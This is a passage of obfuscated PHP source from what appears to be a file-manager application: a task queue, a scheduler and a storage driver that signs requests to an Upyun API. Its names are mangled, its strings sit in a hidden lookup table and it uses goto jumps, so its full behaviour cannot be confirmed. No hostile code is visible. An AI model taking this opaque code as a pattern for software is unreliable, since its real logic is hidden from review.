strtolower($š‰ ›§ [$‚±°Áöº[94]]); $‘Ó¾¯€Š = $GLOBALS[$‚±°Áöº[6]][$‚±°Áöº[88]][$‚±°Áöº[832]]; $‚‚ÚáÂ¤ = $‚±°Áöº[72] . (isset($‘Ó¾¯€Š[$‚‰„¬’]) ? $‘Ó¾¯€Š[$‚‰„¬’] : ucfirst($‚‰„¬’)); if (!class_exists($‚‚ÚáÂ¤)) { show_json("{$‚‚ÚáÂ¤}\40\156\x6f\164\x20\x65\170\151\163\164\163\41", !1); } $Ùª£÷¬è = isset($š‰ ›§ [$‚±°Áöº[6]]) ? $š‰ ›§ [$‚±°Áöº[6]] : !1; self::$driverCache[$Ï–ó—] = new $‚‚ÚáÂ¤($Ùª£÷¬è); } $£€‘Ó¿ = self::$driverCache[$Ï–ó—]; $£€‘Ó¿->pathDriver = $™¿½ì¤; $£€‘Ó¿->pathBase = $‚±°Áöº[33]; if (isset($š‰ ›§ [$‚±°Áöº[6]][$‚±°Áöº[1111]])) { $£€‘Ó¿->pathBase = rtrim($š‰ ›§ [$‚±°Áöº[6]][$‚±°Áöº[1111]], $‚±°Áöº[8]) . $‚±°Áöº[8]; $·ºÇšû = $£€‘Ó¿->pathBase . ltrim($·ºÇšû, $‚±°Áöº[8]); } $·ºÇšû = $£€‘Ó¿->getPath($·ºÇšû); if (isset($ßŸÙŒ[$‚±°Áöº[1083]])) { $·ºÇšû = $ßŸÙŒ[$‚±°Áöº[1083]]; } $£€‘Ó¿->path = $·ºÇšû; return $£€‘Ó¿; } public static function errorTips($ô†úˆÇì = false) { $äêÁ¿…› =& $_SERVER[Ù×¯Ø…]; static $ÎÎÀŸ‡© = array(); $œ²çö¼Ã = 1000; if ($ô†úˆÇì === -1) { return $ÎÎÀŸ‡© ? $ÎÎÀŸ‡©[count($ÎÎÀŸ‡©) - 1] : $äêÁ¿…›[33]; } if ($ô†úˆÇì === !1) { return implode($äêÁ¿…›[229], $ÎÎÀŸ‡©); } if (count($ÎÎÀŸ‡©) >= $œ²çö¼Ã) { $ÎÎÀŸ‡© = array_slice($ÎÎÀŸ‡©, $œ²çö¼Ã * 0.5, $œ²çö¼Ã); } $ÎÎÀŸ‡©[] = $ô†úˆÇì; write_log($äêÁ¿…›[160] . ACTION . $äêÁ¿…›[1112] . $ô†úˆÇì, $äêÁ¿…›[1113]); } public static function getLastError($ºÆ™ˆ¦ô = '') { $üÊáË¨ = self::errorTips(-1); return $üÊáË¨ ? $üÊáË¨ : $ºÆ™ˆ¦ô; } } goto C„Šêˆ—Ú; d³æ™˜•’: class TaskHttp extends Task { protected function startAfter() { $¡œ¯›ÖÆ =& $_SERVER[Ù×¯Ø…]; $·ñ–ÌÁ =& $this->task; $·ñ–ÌÁ[$¡œ¯›ÖÆ[1650]] = 1; Hook::bind($¡œ¯›ÖÆ[1619], array($this, $¡œ¯›ÖÆ[1651])); Hook::bind($¡œ¯›ÖÆ[1621], array($this, $¡œ¯›ÖÆ[1652])); Hook::bind($¡œ¯›ÖÆ[1623], array($this, $¡œ¯›ÖÆ[1653])); } protected function endAfter() { $«ëÀ¦À =& $_SERVER[Ù×¯Ø…]; Hook::unbind($«ëÀ¦À[1619], array($this, $«ëÀ¦À[1651])); Hook::unbind($«ëÀ¦À[1621], array($this, $«ëÀ¦À[1652])); Hook::unbind($«ëÀ¦À[1623], array($this, $«ëÀ¦À[1653])); } public function progressStart($‹™È©úª) { $Å´ˆô»… =& $_SERVER[Ù×¯Ø…]; $ÍÖ¶œøÉ = curl_getinfo($‹™È©úª); self::log($Å´ˆô»…[1654] . $ÍÖ¶œøÉ[$Å´ˆô»…[305]]); self::valueSet($this->task[$Å´ˆô»…[395]], $this->task); } public function progressEnd($¤èÃÃø½) { $÷ÍûÀ™” =& $_SERVER[Ù×¯Ø…]; self::log($÷ÍûÀ™”[1655] . $this->task[$÷ÍûÀ™”[395]]); $this->end(); } public function progress($Ô£µ–Çá, $ÉÃÁ„îì, $´¥®¦‚Ó, $ì™ÚÄ°, $Ÿ«•”šå) { $ÕÏæÈ°â =& $_SERVER[Ù×¯Ø…]; $Ë²ã‡’ =& $this->task; if ($Ÿ«•”šå > 0) { $Ë²ã‡’[$ÕÏæÈ°â[1059]] = $Ë²ã‡’[$ÕÏæÈ°â[1059]] == 0 ? $ì™ÚÄ° : $Ë²ã‡’[$ÕÏæÈ°â[1059]]; $Ë²ã‡’[$ÕÏæÈ°â[1581]] = $Ÿ«•”šå; } else { if ($´¥®¦‚Ó > 0) { $Ë²ã‡’[$ÕÏæÈ°â[1059]] = $Ë²ã‡’[$ÕÏæÈ°â[1059]] == 0 ? $ÉÃÁ„îì : $Ë²ã‡’[$ÕÏæÈ°â[1059]]; $Ë²ã‡’[$ÕÏæÈ°â[1581]] = $´¥®¦‚Ó; } } $this->update(); self::log("\x70\162\x6f\147\x72\x65\163\x73\x48\164\x74\x70\72\144\x6f\x77\x6e\x3a{$´¥®¦‚Ó}\57{$ÉÃÁ„îì}\x3b\40\x75\160\154\157\141\x64\x3a{$Ÿ«•”šå}\57{$ì™ÚÄ°}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\x73\153\x51\165\x65\x75\x65\x4c\145\156\x67\164\150"; const QUEUE_DATA = "\x74\x61\163\x6b\x51\165\145\165\145\x44\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($›éÌÂÑ‰, $§Ãèç§” = array(), $÷‘›ûË¼ = '', $Íµ•´À” = '') { $€®¾¢î¨ =& $_SERVER[Ù×¯Ø…]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Íµ•´À” && array_find_by_field(self::$listData, $€®¾¢î¨[93], $Íµ•´À”)) { return !0; } self::$listData[] = array($€®¾¢î¨[262] => $›éÌÂÑ‰, $€®¾¢î¨[1656] => $§Ãèç§”, $€®¾¢î¨[454] => $÷‘›ûË¼, $€®¾¢î¨[93] => $Íµ•´À”); return !0; } public static function addSubmit() { $·±æ‚†Œ =& $_SERVER[Ù×¯Ø…]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($·±æ‚†Œ[1657] . json_encode_force(array_to_keyvalue(self::$listData, $·±æ‚†Œ[33], $·±æ‚†Œ[454])), $·±æ‚†Œ[1658]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ğ×ùçâ, $ú›¬¶‚Ü = array(), $ÉùÈ¯ˆ¬ = '', $­ˆ‘‰Á’ = '') { $¢Ó¶‘˜‡ =& $_SERVER[Ù×¯Ø…]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ú…Â¶‰ = self::getAll(); if ($­ˆ‘‰Á’ && array_find_by_field($ú…Â¶‰, $¢Ó¶‘˜‡[93], $­ˆ‘‰Á’)) { return !0; } $ú…Â¶‰[] = array($¢Ó¶‘˜‡[262] => $ğ×ùçâ, $¢Ó¶‘˜‡[1656] => $ú›¬¶‚Ü, $¢Ó¶‘˜‡[454] => $ÉùÈ¯ˆ¬, $¢Ó¶‘˜‡[93] => $­ˆ‘‰Á’); write_log($¢Ó¶‘˜‡[1657] . $ÉùÈ¯ˆ¬, $¢Ó¶‘˜‡[1658]); self::setAll($ú…Â¶‰); return !0; } public static function run() { $»É«ÍŞÄ =& $_SERVER[Ù×¯Ø…]; $é†ñ÷ô¥ = self::getAll(); $Šäö±Ÿ = array_shift($é†ñ÷ô¥); if (!$Šäö±Ÿ) { return !1; } self::setAll($é†ñ÷ô¥); $º™İõÈ¾ = timeFloat(); try { Hook::apply($Šäö±Ÿ[$»É«ÍŞÄ[262]], $Šäö±Ÿ[$»É«ÍŞÄ[1656]]); } catch (Exception $â¸¶±ì„) { } $ì½ñÔæº = number_format(timeFloat() - $º™İõÈ¾, 3) . $»É«ÍŞÄ[1594]; write_log($»É«ÍŞÄ[1659] . $Šäö±Ÿ[$»É«ÍŞÄ[454]] . $»É«ÍŞÄ[1660] . $ì½ñÔæº, $»É«ÍŞÄ[1658]); return !0; } public static function count() { $ÚµµéÁ¿ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ÚµµéÁ¿) { return 0; } return intval($ÚµµéÁ¿); } public static function getAll() { $ÏÜœŒ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ÏÜœŒ) { return array(); } return $ÏÜœŒ; } public static function setAll($×ˆ¢á±æ) { $Ê×ÌÑ× = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($×ˆ¢á±æ), $Ê×ÌÑ×); Cache::set(self::QUEUE_DATA, $×ˆ¢á±æ, $Ê×ÌÑ×); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÆÅ©Şôà, $õ‘â·ƒÙ = 5.0) { if (!$ÆÅ©Şôà) { return; } $êÂ‘Õö = Cache::get($ÆÅ©Şôà); if (!$êÂ‘Õö || timeFloat() - floatVal($êÂ‘Õö) >= $õ‘â·ƒÙ) { Cache::set($ÆÅ©Şôà, timeFloat(), $õ‘â·ƒÙ * 10); return !0; } return !1; } public static function timeLimitCall($æŸÚ‚«É, $©‘¯Åµ, $ÜİÉùÙÅ, $ş¬›“¢Ü = 5.0) { $ËÜ³ ¡± =& $_SERVER[Ù×¯Ø…]; if (!$æŸÚ‚«É || !$©‘¯Åµ) { return; } self::$asyncAdd = !0; $æÁôÛÛ€ = $ËÜ³ ¡±[1661]; $²¬Ú¬Ş = Cache::get($æÁôÛÛ€, !0); $ïŸœÔ”´ = array($ËÜ³ ¡±[1662] => timeFloat(), $ËÜ³ ¡±[1663] => timeFloat(), $ËÜ³ ¡±[262] => $©‘¯Åµ, $ËÜ³ ¡±[1656] => $ÜİÉùÙÅ, $ËÜ³ ¡±[197] => $ş¬›“¢Ü); if (is_array($²¬Ú¬Ş[$æŸÚ‚«É])) { $ïŸœÔ”´[$ËÜ³ ¡±[1663]] = $²¬Ú¬Ş[$æŸÚ‚«É][$ËÜ³ ¡±[1663]]; } if (is_array($²¬Ú¬Ş[$æŸÚ‚«É])) { if (timeFloat() - $²¬Ú¬Ş[$æŸÚ‚«É][$ËÜ³ ¡±[1662]] < $ïŸœÔ”´[$ËÜ³ ¡±[197]] * 0.3) { return; } $ïŸœÔ”´[$ËÜ³ ¡±[1663]] = $²¬Ú¬Ş[$æŸÚ‚«É][$ËÜ³ ¡±[1663]]; } $²¬Ú¬Ş[$æŸÚ‚«É] = $ïŸœÔ”´; Cache::set($æÁôÛÛ€, $²¬Ú¬Ş, 60); Cache::removeMemory($æÁôÛÛ€); write_log($ËÜ³ ¡±[1664] . $æŸÚ‚«É . $ËÜ³ ¡±[68] . $©‘¯Åµ, $ËÜ³ ¡±[1658]); } public static function timeLimitCallLoop() { $Ëù˜‰ =& $_SERVER[Ù×¯Ø…]; $ó×ÜÕä° = array($Ëù˜‰[1665]); $šÉÃç«‡ = in_array(strtolower(ACTION), $ó×ÜÕä°); if (!$šÉÃç«‡ && !self::$asyncAdd) { return; } $Â¨¬Æşâ = $Ëù˜‰[1661]; $·™˜ı« = Cache::get($Â¨¬Æşâ, !0); if (!$·™˜ı« || count($·™˜ı«) <= 0) { return; } $‚şŒ¹‰ê = !1; $êŠ€üíœ = timeFloat(); $¶­Ö©õµ = array(); foreach ($·™˜ı« as $Ú½ÒÃ®ò => $åÕˆŞÕ) { if ($êŠ€üíœ - $åÕˆŞÕ[$Ëù˜‰[1663]] > $åÕˆŞÕ[$Ëù˜‰[197]]) { $‚şŒ¹‰ê = !0; try { Hook::apply($åÕˆŞÕ[$Ëù˜‰[262]], $åÕˆŞÕ[$Ëù˜‰[1656]]); write_log($Ëù˜‰[1666] . $Ú½ÒÃ®ò . $Ëù˜‰[68] . $åÕˆŞÕ[$Ëù˜‰[262]] . $Ëù˜‰[1667] . ACTION, $Ëù˜‰[1658]); } catch (Exception $ö‰šİµÁ) { } continue; } $¶­Ö©õµ[$Ú½ÒÃ®ò] = $åÕˆŞÕ; } if (!$‚şŒ¹‰ê) { return; } if (!$¶­Ö©õµ) { return Cache::remove($Â¨¬Æşâ); } Cache::set($Â¨¬Æşâ, $¶­Ö©õµ, 60); Cache::removeMemory($Â¨¬Æşâ); } public static function finished($Ú–ÉÙÙ, $‡³ÁÓ¹Š) { $ğÒ‚×•‘ =& $_SERVER[Ù×¯Ø…]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ğÒ‚×•‘[262] => $Ú–ÉÙÙ, $ğÒ‚×•‘[1656] => $‡³ÁÓ¹Š); } private static function finishedRun() { $“äÛ´Ÿä =& $_SERVER[Ù×¯Ø…]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $È†Í’ª) { try { Hook::apply($È†Í’ª[$“äÛ´Ÿä[262]], $È†Í’ª[$“äÛ´Ÿä[1656]]); } catch (Exception $¡·ÎĞ²û) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto f®¡ƒÍ»ä; F¿Ø¸¿À‰¥: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\160\x3a\57\x2f\166\x30\x2e\x61\160\x69\x2e\x75\x70\171\x75\x6e\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¥àÒ®§¢) { parent::__construct(); $this->_init($¥àÒ®§¢); } public function _init($„Ş‰é“Å) { $ÙÈ‚ı‹ú =& $_SERVER[Ù×¯Ø…]; foreach ($„Ş‰é“Å as $é½¶Ì„Å => $ø¶Œ—¾É) { if (isset($this->{$é½¶Ì„Å})) { $this->{$é½¶Ì„Å} = $ø¶Œ—¾É; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÙÈ‚ı‹ú[1377] . LNG($ÙÈ‚ı‹ú[1310])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($”ÙãË‡, $Ş›·«ïé = "\107\105\x54") { $ÈœàÊˆ =& $_SERVER[Ù×¯Ø…]; $æã×Ó¶ = gmdate($ÈœàÊˆ[1343]); $¹ªïÛªÔ = base64_encode(hash_hmac($ÈœàÊˆ[1378], "{$Ş›·«ïé}\46{$”ÙãË‡}\46{$æã×Ó¶}", md5("{$this->userpass}"), !0)); $¡–ıµ«ƒ = array("\101\165\x74\150\x6f\x72\151\x7a\141\x74\151\157\156\72\x55\120\131\x55\116\40{$this->username}\x3a{$¹ªïÛªÔ}", "\104\x61\164\x65\x3a{$æã×Ó¶}"); return $¡–ıµ«ƒ; } public function ussRequest($Óıâİè, $îìá´ ì = "\x47\105\124", $•é³Ï£ = false, $–úô­áÉ = false, $¬ÁáÈœÈ = false) { $›µ£¯ Ä =& $_SERVER[Ù×¯Ø…]; $Óıâİè = trim($Óıâİè, $›µ£¯ Ä[8]); $òÈÍ¹† = "\x2f{$this->bucket}\57{$Óıâİè}"; $ûñùµî = $this->ussHeaders($òÈÍ¹†, $îìá´ ì); if ($–úô­áÉ) { $ûñùµî = array_merge($ûñùµî, $–úô­áÉ); } $Œ¬¿¹ÃÛ = url_request($this->endpoint . $òÈÍ¹†, $îìá´ ì, $•é³Ï£, $ûñùµî, $¬ÁáÈœÈ); if (!$Œ¬¿¹ÃÛ) { return array($›µ£¯ Ä[1121] => !1, $›µ£¯ Ä[1123] => $›µ£¯ Ä[1379]); } if (strtolower($îìá´ ì) == $›µ£¯ Ä[190] || in_array($Œ¬¿¹ÃÛ[$›µ£¯ Ä[1121]], array($›µ£¯ Ä[1236], $›µ£¯ Ä[1380]))) { $•é³Ï£ = $Œ¬¿¹ÃÛ[$›µ£¯ Ä[1381]]; } else { $•é³Ï£ = json_decode($Œ¬¿¹ÃÛ[$›µ£¯ Ä[1123]], !0); if (!$•é³Ï£) { $•é³Ï£ = $Œ¬¿¹ÃÛ[$›µ£¯ Ä[1123]]; } else { if (!$Œ¬¿¹ÃÛ[$›µ£¯ Ä[749]] && isset($•é³Ï£[$›µ£¯ Ä[1382]])) { $•é³Ï£ = $•é³Ï£[$›µ£¯ Ä[1382]]; } } } return array($›µ£¯ Ä[1121] => $Œ¬¿¹ÃÛ[$›µ£¯ Ä[749]], $›µ£¯ Ä[1123] => $•é³Ï£); } public function mkfile($µ½œİ¯÷, $¿¾î­„’ = '', $ê”´€¾Á = REPEAT_RENAME) { if ($this->setContent($µ½œİ¯÷, $¿¾î­„’)) { return $this->getPathOuter($µ½œİ¯÷); } return !1; } public function mkdir($¡ˆŒĞšÖ, $×°‡ÓĞ¤ = REPEAT_SKIP) { $İ™ĞËÈ× =& $_SERVER[Ù×¯Ø…]; $°ëˆŠ×£ = trim($¡ˆŒĞšÖ, $İ™ĞËÈ×[8]); if ($this->_isFolder($°ëˆŠ×£)) { return $this->getPathOuter($°ëˆŠ×£); } $§„‰¸”‹ = array($İ™ĞËÈ×[1383]); $Åïùı°Ù = $this->ussRequest($°ëˆŠ×£, $İ™ĞËÈ×[224], !1, $§„‰¸”‹); return $Åïùı°Ù[$İ™ĞËÈ×[1121]] ? $this->getPathOuter($°ëˆŠ×£) : !1; } public function copyFile($À×÷›å«, $åæÕ“˜) { $ĞÁÀ®æ =& $_SERVER[Ù×¯Ø…]; $Ô¤èÚ‡ = array($ĞÁÀ®æ[1384] . "\57{$this->bucket}\57{$À×÷›å«}", $ĞÁÀ®æ[1385]); $®ş²ø¹ß = $this->ussRequest($åæÕ“˜, $ĞÁÀ®æ[226], !1, $Ô¤èÚ‡); return $®ş²ø¹ß[$ĞÁÀ®æ[1121]] ? !0 : $this->getPathOuter($åæÕ“˜); } public function moveFile($Õü’×è, $®‰È¿À) { $¸Ã½¦ö¿ =& $_SERVER[Ù×¯Ø…]; $ıòîæ¹ô = array($¸Ã½¦ö¿[1386] . "\57{$this->bucket}\57{$Õü’×è}", $¸Ã½¦ö¿[1385]); $şìÔÊ“Â = $this->ussRequest($®‰È¿À, $¸Ã½¦ö¿[226], !1, $ıòîæ¹ô); return $şìÔÊ“Â[$¸Ã½¦ö¿[1121]] ? !0 : $this->getPathOuter($®‰È¿À); } public function delFile($Ôúê¨—Ş) { $ªªÒ“–Â =& $_SERVER[Ù×¯Ø…]; $×ôíË´ù = $this->ussRequest($Ôúê¨—Ş, $ªªÒ“–Â[1387]); return $×ôíË´ù[$ªªÒ“–Â[1121]] ? !0 : !1; } public function delFolder($Çù×ñ») { $†Ü „Ã =& $_SERVER[Ù×¯Ø…]; if (!$this->exist($Çù×ñ»)) { return !0; } $this->listItemCache = !1; $ö¥ŸŞí» = $õ’Â¹×“ = array(); $this->fileList($Çù×ñ», $ö¥ŸŞí», $õ’Â¹×“, !0); $this->listItemCache = !0; foreach ($õ’Â¹×“ as $Ó†ÇÑµ) { $Ñß½£¹û = $this->ussRequest($Ó†ÇÑµ[$†Ü „Ã[28]], $†Ü „Ã[1387]); if (!$Ñß½£¹û[$†Ü „Ã[1121]]) { return !1; } } foreach ($ö¥ŸŞí» as $Ççåì›ö) { $Ñß½£¹û = $this->ussRequest($Ççåì›ö, $†Ü „Ã[1387]); if (!$Ñß½£¹û[$†Ü „Ã[1121]]) { return !1; } } $Ñß½£¹û = $this->ussRequest($Çù×ñ», $†Ü „Ã[1387]); return $Ñß½£¹û[$†Ü „Ã[1121]]; } public function rename($ï¦»ÄùÅ, $åÊªşª×) { if ($this->isFile($ï¦»ÄùÅ)) { $åÊªşª× = get_path_father($ï¦»ÄùÅ) . $åÊªşª×; return $this->moveFile($ï¦»ÄùÅ, $åÊªşª×); } return $this->renameObject($ï¦»ÄùÅ, $åÊªşª×); } public function fileInfo($¶ÅØúã“, $’÷íªş¯ = false, $‘øåªÂ™ = array()) { $Í†øè­ =& $_SERVER[Ù×¯Ø…]; $«Œ ½ñ = array($Í†øè­[28] => $this->pathThis($¶ÅØúã“), $Í†øè­[76] => $this->getPathOuter($Í†øè­[8] . $¶ÅØúã“), $Í†øè­[29] => $Í†øè­[193], $Í†øè­[78] => isset($‘øåªÂ™[$Í†øè­[78]]) ? $‘øåªÂ™[$Í†øè­[78]] : 0, $Í†øè­[168] => $this->ext($¶ÅØúã“)); if ($’÷íªş¯) { return $«Œ ½ñ; } $«Œ ½ñ[$Í†øè­[194]] = $«Œ ½ñ[$Í†øè­[84]] = 0; $«Œ ½ñ[$Í†øè­[195]] = $«Œ ½ñ[$Í†øè­[196]] = !0; if (empty($‘øåªÂ™)) { $‘øåªÂ™ = $this->objectMeta($¶ÅØúã“); if (!$‘øåªÂ™) { return $«Œ ½ñ; } } $«Œ ½ñ[$Í†øè­[194]] = intval($‘øåªÂ™[$Í†øè­[1388]]); $«Œ ½ñ[$Í†øè­[84]] = intval($‘øåªÂ™[$Í†øè­[1389]]); $«Œ ½ñ[$Í†øè­[78]] = $‘øåªÂ™[$Í†øè­[78]]; return $«Œ ½ñ; } public function folderInfo($¿â¨ÊöÚ, $ÀÍã‡îÂ = false) { $ˆ–¾­÷ =& $_SERVER[Ù×¯Ø…]; $ñ´âÃÏÍ = array($ˆ–¾­÷[28] => $this->pathThis($¿â¨ÊöÚ), $ˆ–¾­÷[76] => $this->getPathOuter($ˆ–¾­÷[8] . $¿â¨ÊöÚ), $ˆ–¾­÷[29] => $ˆ–¾­÷[77]); if ($ÀÍã‡îÂ) { return $ñ´âÃÏÍ; } $ñ´âÃÏÍ[$ˆ–¾­÷[194]] = $ñ´âÃÏÍ[$ˆ–¾­÷[84]] = 0; $ñ´âÃÏÍ[$ˆ–¾­÷[195]] = $ñ´âÃÏÍ[$ˆ–¾­÷[196]] = !0; if (empty($ºş¢şõ)) { $ºş¢şõ = $this->objectMeta($¿â¨ÊöÚ); if (!$ºş¢şõ) { return $ñ´âÃÏÍ; } } $ñ´âÃÏÍ[$ˆ–¾­÷[194]] = intval($ºş¢şõ[$ˆ–¾­÷[1388]]); $ñ´âÃÏÍ[$ˆ–¾­÷[84]] = intval($ºş¢şõ[$ˆ–¾­÷[1389]]); return $ñ´âÃÏÍ; } private function listObjs($ŞÈûÂö’, $öÍ¶ó–± = 0, $Ô¬ˆˆ‘ = 1000) { $ƒ“ú°Ã =& $_SERVER[Ù×¯Ø…]; $½û¾Ê = array($ƒ“ú°Ã[1390], $ƒ“ú°Ã[1391] . $Ô¬ˆˆ‘); if ($öÍ¶ó–±) { $½û¾Ê[] = $ƒ“ú°Ã[1392] . $öÍ¶ó–±; } $–…ï¢¤‘ = $this->ussRequest($ŞÈûÂö’, $ƒ“ú°Ã[228], !1, $½û¾Ê); return !$–…ï¢¤‘[$ƒ“ú°Ã[1121]] ? !1 : $–…ï¢¤‘[$ƒ“ú°Ã[1123]]; } private function fileList($Ïù¡ÈÁ´, &$˜Øçùü, &$êÆÔşşâ, $£ï×Í»¤ = false) { $åœ ®ş¦ =& $_SERVER[Ù×¯Ø…]; $®†íõ‰¾ = $åœ ®ş¦[33]; $ÂÔÆ¿ÃŠ = 1000; $·ÆÍ½Æ = rtrim($Ïù¡ÈÁ´, $åœ ®ş¦[8]) . $åœ ®ş¦[8]; $°½øÇç­ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $Ş±ÏÜº¦ = $this->listObjs($Ïù¡ÈÁ´, $®†íõ‰¾, $ÂÔÆ¿ÃŠ); if (!$Ş±ÏÜº¦) { return !1; } $®†íõ‰¾ = isset($Ş±ÏÜº¦[$åœ ®ş¦[1393]]) ? $Ş±ÏÜº¦[$åœ ®ş¦[1393]] : $åœ ®ş¦[33]; $°’ì»±» = isset($Ş±ÏÜº¦[$åœ ®ş¦[1394]]) ? $Ş±ÏÜº¦[$åœ ®ş¦[1394]] : array(); foreach ($°’ì»±» as $Ü©Ã‡èÖ) { $‘‰¸ñ¼ = $Ü©Ã‡èÖ[$åœ ®ş¦[29]] == $åœ ®ş¦[77] ? !0 : !1; $Êá‹ó¤ = ltrim($·ÆÍ½Æ . $Ü©Ã‡èÖ[$åœ ®ş¦[28]], $åœ ®ş¦[8]) . ($‘‰¸ñ¼ ? $åœ ®ş¦[8] : $åœ ®ş¦[33]); $±ò¨ñÁ’ = array($åœ ®ş¦[28] => $Êá‹ó¤, $åœ ®ş¦[29] => $‘‰¸ñ¼ ? $åœ ®ş¦[77] : $åœ ®ş¦[193], $åœ ®ş¦[78] => $Ü©Ã‡èÖ[$åœ ®ş¦[335]], $åœ ®ş¦[1389] => $Ü©Ã‡èÖ[$åœ ®ş¦[1395]]); if ($°½øÇç­) { $this->cacheMethod($åœ ®ş¦[199], $Êá‹ó¤, $‘‰¸ñ¼); $this->cacheMethod($åœ ®ş¦[200], $Êá‹ó¤, $±ò¨ñÁ’); } if ($‘‰¸ñ¼) { $˜Øçùü[] = $Êá‹ó¤; if ($£ï×Í»¤) { $this->fileList($Êá‹ó¤, $˜Øçùü, $êÆÔşşâ, $£ï×Í»¤); } continue; } $êÆÔşşâ[] = $±ò¨ñÁ’; } if (count($°’ì»±») < $ÂÔÆ¿ÃŠ) { break; } } if ($°½øÇç­) { $this->cacheMethod($åœ ®ş¦[199], $Ïù¡ÈÁ´, !0); } } public function listPath($² Ğ„×, $ÍİŞ…õ = false) { $î¯¢ê =& $_SERVER[Ù×¯Ø…]; $Ô¤†€°ë = $Ù¤Ù‡ = array(); $this->fileList($² Ğ„×, $Ô¤†€°ë, $Ù¤Ù‡); foreach ($Ô¤†€°ë as $¥Úñ‚• => $£è¸„Ú‹) { $Ô¤†€°ë[$¥Úñ‚•] = $this->folderInfo($£è¸„Ú‹, $ÍİŞ…õ); } foreach ($Ù¤Ù‡ as $¥Úñ‚• => $£è¸„Ú‹) { $Ù¤Ù‡[$¥Úñ‚•] = $this->fileInfo($£è¸„Ú‹[$î¯¢ê[28]], $ÍİŞ…õ, $£è¸„Ú‹); } return array($î¯¢ê[75] => $Ô¤†€°ë, $î¯¢ê[74] => $Ù¤Ù‡); } public function has($×ƒ·ƒÕÜ, $šÓüß³ = false, $Íˆ“ƒÍ = true) { $úëàõ½± =& $_SERVER[Ù×¯Ø…]; $è¬Öå‚Æ = $úëàõ½±[33]; $†˜î¨‘ = 500; $øÊ†Şí = 0; $ıà‰öÎµ = 0; $ñÒùÉ±¦ = rtrim($×ƒ·ƒÕÜ, $úëàõ½±[8]) . $úëàõ½±[8]; while (!0) { check_abort(); $­ùĞì¢˜ = $this->listObjs($×ƒ·ƒÕÜ, $è¬Öå‚Æ, $†˜î¨‘); if (!$­ùĞì¢˜) { return !1; } $è¬Öå‚Æ = isset($­ùĞì¢˜[$úëàõ½±[1393]]) ? $­ùĞì¢˜[$úëàõ½±[1393]] : $úëàõ½±[33]; $®™ÉÇüô = isset($­ùĞì¢˜[$úëàõ½±[1394]]) ? $­ùĞì¢˜[$úëàõ½±[1394]] : array(); if (empty($®™ÉÇüô)) { break; } $•ñòç§ = array_filter($®™ÉÇüô, function ($½Îğ°Ç¥) { $´ÃÑËîŸ =& $_SERVER[Ù×¯Ø…]; return $½Îğ°Ç¥[$´ÃÑËîŸ[29]] == $´ÃÑËîŸ[77]; }); $‚•…£Ø£ = count($®™ÉÇüô); $•ñòç§ = count($•ñòç§); $“‚¯ÚœÛ = $‚•…£Ø£ - $•ñòç§; if ($šÓüß³) { $ıà‰öÎµ += $•ñòç§; $øÊ†Şí += $“‚¯ÚœÛ; if ($‚•…£Ø£ < $†˜î¨‘) { break; } continue; } if ($Íˆ“ƒÍ) { if ($“‚¯ÚœÛ) { return !0; } } else { if ($•ñòç§) { return !0; } } if ($‚•…£Ø£ < $†˜î¨‘) { break; } } if ($šÓüß³) { return array($úëàõ½±[203] => $øÊ†Şí, $úëàõ½±[204] => $ıà‰öÎµ); } return !1; } public function listAll($Öè›³ş¯) { $ú«¦œñí =& $_SERVER[Ù×¯Ø…]; $ûòÃ¹ù‡ = $ıÒ¤’ğ• = array(); $this->fileList($Öè›³ş¯, $ûòÃ¹ù‡, $ıÒ¤’ğ•, !0); $–úµ»‡© = array(); foreach ($ıÒ¤’ğ• as $Ò¦œø¥) { $–úµ»‡©[$Ò¦œø¥[$ú«¦œñí[28]]] = $Ò¦œø¥[$ú«¦œñí[78]]; } foreach ($ûòÃ¹ù‡ as $Ò¦œø¥) { if (is_string($Ò¦œø¥)) { $–úµ»‡©[$Ò¦œø¥] = 0; } } return $this->listAllFiles($Öè›³ş¯, array_keys($–úµ»‡©), $–úµ»‡©); } public function canRead($…’ãˆçÁ) { return $this->exist($…’ãˆçÁ) ? !0 : !1; } public function canWrite($‹ÂˆõÓ) { return $this->exist($‹ÂˆõÓ) ? !0 : !1; } public function getContent($ïïô°Åñ) { return $this->fileSubstr($ïïô°Åñ, 0, -1); } public function setContent($²óø¿Òª, $Ğ×Ç¹¡¸ = '') { $İÔ”ÖÇÔ =& $_SERVER[Ù×¯Ø…]; if (!$Ğ×Ç¹¡¸) { $ïŠšğøø = $this->ussRequest($²óø¿Òª, $İÔ”ÖÇÔ[224]); return $ïŠšğøø[$İÔ”ÖÇÔ[1121]]; } $áÈòˆ ç = $this->tempFile($this->pathThis($²óø¿Òª)); file_put_contents($áÈòˆ ç, $Ğ×Ç¹¡¸); if ($this->upload($²óø¿Òª, $áÈòˆ ç)) { $this->tempFileRemve($áÈòˆ ç); return !0; } return !1; } public function fileSubstr($Üä¶Šù, $É‹ëúÚÁ, $›¶¢“—´) { $×›êÚı =& $_SERVER[Ù×¯Ø…]; if (!($ÔÉ´÷¶ı = $this->link($Üä¶Šù))) { return !1; } $Û«ãÖ«š = !1; if ($›¶¢“—´ > 0) { $‚¤»¸—ã = 